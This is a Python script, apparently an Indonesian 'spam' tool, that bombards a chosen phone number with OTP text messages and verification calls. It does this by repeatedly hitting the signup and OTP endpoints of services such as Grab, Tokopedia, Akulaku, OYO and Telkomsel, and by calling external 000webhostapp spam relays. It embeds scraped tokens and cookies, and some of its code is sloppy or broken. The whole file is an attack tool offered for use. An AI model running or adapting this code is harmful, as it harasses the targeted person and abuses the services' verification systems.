# -*- coding: utf-8 -*-
import requests, sys
sys.path.insert (0, "..")
from warna import *
s = Session()


jl = json.load (open ("nomor.json"))
nomor = jl["nomor"]
jumlah = int(jl["jumlah"])
jeda = jl["jeda"]
nomor1 = nomor[1:]
nomor2 = "62"+ nomor1
nomor3 = "+"+ nomor2


def ulang():
	sys.stdout.flush ()
	system ("sleep "+ jeda)


def Call_AKULAKU():
	try:
		for i in range (jumlah):
			rg = get ("https://id-app.akulaku.com/installment/api/json/user/register/captcha/get.do?countryId=1&phoneNumber="+ nomor +"&useCall=1&tryLogin=0").text
			if "true" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ua +" AKULAKU"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Call_AKULAKU()


def Call_CitCall():
	try:
		for i in range (jumlah):
			sp = s.post ("https://www.citcall.com/demo/misscallapi.php", data = {"cid": nomor2, "trying": "0", "csrf_token": re.findall(r'id="csrf_token" value="(.*?)">', s.get ("https://www.citcall.com/demo/misscallapi.php").text)[0]}, headers = {"x-requested-with": "XMLHttpRequest"}).text
			if "Success" in sp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ uc +" CitCall"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Call_CitCall()


def Call_Grab():
	try:
		for i in range (jumlah):
			rp = post ("https://api.grab.com/grabid/v1/phone/otp", data = {"method": "CALL", "countryCode": "id", "phoneNumber": nomor2, "templateID": "pax_android_production"}).text
			if "challengeID" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ug +" Grab"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Call_Grab()


def Call_Tokopedia():
	try:
		for i in range (jumlah):
			rp = post ("https://www.tokocash.com/oauth/otp", data = {"msisdn": nomor, "accept": "call"}).text
			if "200000" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ut +" Tokopedia"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Call_Tokopedia()


def Sms_4444():
	try:
		for i in range (jumlah):
			rp = post ("https://registrasi.tri.co.id/daftar/generateOTP", data = {"msisdn": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Cookie": "PHPSESSID=5noisam2cugiq25l6374u79975", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36"}).text
			if "success" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ u4 +" 4444"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_4444()


def Sms_AKULAKU():
	try:
		for i in range (jumlah):
			rg = get ("https://id-app.akulaku.com/installment/api/json/user/register/captcha/get.do?countryId=1&phoneNumber="+ nomor +"&useSms=1&tryLogin=0").text
			if "true" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ua +" AKULAKU"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_AKULAKU()


def Sms_Grab():
	try:
		for i in range (jumlah):
			rp = post ("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data = {"phoneNumber": nomor2, "countryCode": "ID", "name": "IRUL", "email": "IRUL@gmail.com", "deviceToken": "*"}, headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"}).text
			if "phoneNumber" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ug +" Grab"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_Grab()


def Sms_HOOQTV():
	try:
		for i in range (jumlah):
			br = Browser()
			br.set_handle_equiv(True)
			br.set_handle_gzip(True)
			br.set_handle_redirect(True)
			br.set_handle_referer(True)
			br.set_handle_robots(False)
			br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
			br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]
			br.open ("https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7")
			br.select_form(nr=0)
			br.form["mobile"] = nomor1
			#br.form["password"] = "JEKITUT"
			rbs = br.submit().read()
			if "confirmotp" in rbs:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uh +" HOOQTV"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except URLError:
		koneksi()
		Sms_HOOQTV()


def Sms_JOY_JD_id():
	try:
		for i in range (jumlah):
			rp = post ("https://passport.jd.id/sms/sendSMSCode", data = {"phone": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Cookie": "__jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Host": "passport.jd.id", "Referer": "https://passport.jd.id/register/phone", "X-Requested-With": "XMLHttpRequest"}).text
			if "true" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uj +" JOY-JD.id"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_JOY_JD_id()


def Sms_OYO():
	try:
		for i in range (jumlah):
			rg = get ("https://api.oyorooms.com/v2/users/generate_otp?phone="+ nomor +"&nod=4&intent=login&sms_auto_retrieval=true&country_code=%2B62&version=20176&partner_app_version=20176&android_id=6bb443543d62ab32&idfa=f4883355-288c-4528-b38f-d52ac56746f4&sid=154377531495", headers = {"access_token": "QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Authorization": "Basic QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Content-Type": "application/json", "OYO_AB_CONFIG": "1543775334527|dea:1|mwhp:1|t3c:1|epba:0|rst2:1|phbb:0|wcta:1|wtea:1|cdr2:0|popl:0|bann:1|sbma:1|rae:1|gmfh:1|prep:1|hbna:1|absb:0|sbmi:1|se5:10|se4:1|se6:15|cour:0|gsra:1|rtsi:1|cdr:1|rd:1|lzpi:1|uprc:1|rbl:1|rsa:0|dww2:1|deal:0|pnpd:1|rcua:1|rsi:0|gsti:1|dwep:2|otp4:1|urha:1|ppa:2|ona:0|svh:1|stc2:1|urhi:1|ppi:2|gsta:0|nlab:1|asa:1|cr:1|rts:1|nlp:1|onab:1|asi:0|wtei:1|asei:1|bsba:2|aca:1|bea:1|wtib:2|lyr:0|aci:0|scta:0|tspk:1|tspj:1|DWWS:1|a2hs:1|brch:4|test:1|raab:0|aswp:1|shli:0|hrt:1|riab:0|hbad:0|rcui:1|sbpa:0|stcl:0|sbpi:0|sinc:1|shla:0|brea:1|lpta:0|lpti:0|ffab:1|his2:0|hbci:1|pst:1|stfi:2|pce:1|stft:2|omue:0|brei:1|hsei:0|sold:1|hbca:1|home:1|scti:0|otab:1|gsa:1|dwhp:0|gsi:1|rasl:0|locr:0|obai:1|dbad:1|nrca:1|epa:2|nrci:1|epi:0|epn:2|fbb:0|trab:1|rmo2:1|niab:0|weng:0|sls:1|phli:0|gpwa:0|nsl:0|prpa:1|saet:1|gpwi:0|nrfa:0|prpi:1|hbi2:0|saea:1|mrc:1|blh:1|cpab:1|hpsa:0|octt:1|phb:1|hpsi:0|cadd:1|nsfa:1|oban:1|spc2:1|smla:0|auto:0|uiab:1|wtab:3|shel:1|hmpi:1|bdpi:1|pbra:1|sos:2|logn:1|rms:1|uaab:1|papg:1|bdpa:1|pbri:1|nob2:1|swar:1|aowt:1|spc:1|trCl:1|lbh:1|nrfi:0|lsc:1|pdhi:0|tsb:1|lsc2:0|diei:1|dmme:1|diea:1|dte:1|acsi:1|pdha:0|mwen:0|efa:1|hpwa:0|fbb2:0|sra:2|reca:1|paab:0|mwep:2|ngst:1|hpwi:1|reci:1|piab:1|aimg:1|ffib:1|mww2:1|ioab:1|hpfd:0|srz:0|socp:0|plwc:1", "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"}).text
			if "status" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uo +" OYO"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_OYO()


def Sms_OYOHOTELS():
	try:
		for i in range (jumlah):
			rg = get ("https://www.oyorooms.com/api/pwa/generateotp?phone="+ nomor +"&country_code=+62").text
			if "status" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uo +" OYOHOTELS"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_OYOHOTELS()


def Sms_PHD_Order():
	try:
		for i in range (jumlah):
			rp = post ("https://www.phd.co.id/en/users/sendOTP", data = {"phone_number": nomor}, headers = {"Referer": "https://www.phd.co.id/en/users/createnewuser", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}).text
			if "OK" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ up +" PHD Order"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_PHD_Order()


def Sms_TIX_ID():
	try:
		for i in range (jumlah):
			rp = post ("https://api.tix.id:443/v1/otp/send_otp", data = '{"device_os": "android", "msisdn": "'+ nomor3 +'"}', headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtc2lzZG4iOiIiLCJ1c2VyX2lkIjoiIiwicHVycG9zZSI6Im5vdGxvZ2luIiwiYXVkIjoiVGl4SUQgTWlkZGxld2FyZSIsImV4cCI6MTU2NTg5MDMxMiwiaWF0IjoxNTU3MjUwMzEyLCJpc3MiOiJUaXhJRCBTZWN1cml0eSBBdXRob3JpdHkiLCJzdWIiOiJNb2JpbGUgYXV0aG9yaXphdGlvbiB0b2tlbiJ9.2OXxPRGeMb8hwuMc12uJVr4Kxlp98RVg-vNl6haTXv8", "Connection": "Keep-Alive", "Content-Type": "application/json", "User-Agent": "okhttp/3.9.0"}).text
			if "true" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ut +" TIX ID"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_TIX_ID()


def Sms_Tokopedia():
	try:
		for i in range (jumlah):
			rp = post ("https://www.tokocash.com/oauth/otp", data = {"msisdn": nomor, "accept": ""}).text
			if "200000" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ut +" Tokopedia"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_Tokopedia()


def Sms_TSEL_APPS():
	try:
		for i in range (jumlah):
			rp = post ("https://tdwidm.telkomsel.com/passwordless/start", data = {"phone_number": nomor3, "connection": "sms"}, headers = {"Accept": "application/json, text/javascripte", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://my.telkomsel.com", "Referer": "https://my.telkomsel.com/", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36"}).text
			if "_id" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ut +" TSEL-APPS"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_TSEL_APPS()


def Sms_Yapulsa():
	try:
		for i in range (jumlah):
			rp = post ("https://gmapi.yapulsa.com:443/api/v1/alphapay/user/add_new_username_only", data = '{"phonenumber": "'+ nomor +'"}', headers = {"Content-Type": "application/json; charset=utf-8", "source": "Android 2.6.0", "X-APP": "Android 2.6.0", "X-IMEI": "0", "User-Agent": "okhttp/3.4.1"}).text
			if "SUCCES" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uy +" Yapulsa"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_Yapulsa()


def Url_Call_Grab():
	try:
		for i in range (jumlah):
			rg = get ("https://hot-coba111.000webhostapp.com/call.php?nomor="+ nomor +"&method=grab").text
			if "Spam Terkirim" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ug +" Grab"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Call_Grab()


def Url_Sms_5_Pesan():
	try:
		for i in range (jumlah):
			rg = get ("https://hot-coba111.000webhostapp.com/sms.php?nomor="+ nomor +"&paket=1").text
			if "challengeID" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ u5 +" 5 Pesan"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Sms_5_Pesan()


def Url_Call_Tokopedia():
	try:
		for i in range (jumlah):
			rg = get ("https://hot-coba111.000webhostapp.com/call.php?nomor="+ nomor +"&method=toped").text
			if "Coba lagi nanti" in rg:
				gagal.append (i)
			elif "Sisa limit harian telp ke nomor" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ut +" Tokopedia"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Call_Tokopedia()


def Url_Sms_5_Pesan_():
	try:
		for i in range (jumlah):
			rg = get ("https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor="+ nomor +"&paket=1").text
			if "challengeID" in rg:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ u5 +" 5 Pesan"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Sms_5_Pesan_()


def Url_Call_Grab_():
	try:
		for i in range (jumlah):
			rp = post ("https://zpammers.000webhostapp.com/Spam/Call.php", data = {"Nomer": nomor}).text
			if "Success Call" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ ug +" Grab"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Call_Grab_()


def Url_Sms_OYO():
	try:
		for i in range (jumlah):
			rp = post ("https://zpammers.000webhostapp.com/Spam/Spam.php", data = {"Nomer": nomor}).text
			if "Sms Succes Ke" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uo +" OYO"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Url_Sms_OYO()


def irul():
	Call_AKULAKU()
	Call_CitCall()
	Call_Grab()
	Call_Tokopedia()
	Sms_4444()
	Sms_AKULAKU()
	Sms_Grab()
	Sms_HOOQTV()
	Sms_JOY_JD_id()
	Sms_OYO()
	Sms_OYOHOTELS()
	Sms_PHD_Order()
	Sms_TIX_ID
	Sms_Tokopedia()
	Sms_TSEL_APPS()
	Sms_Yapulsa()
	Url_Call_Grab()
	Url_Sms_5_Pesan()
	Url_Call_Tokopedia()
	Url_Sms_5_Pesan_()
	Url_Call_Grab_()
	Url_Sms_OYO()
	system ("php irul.php")
	system ("python2 Sms_4444 "+ nomor)
	enter()


#irul()
enter()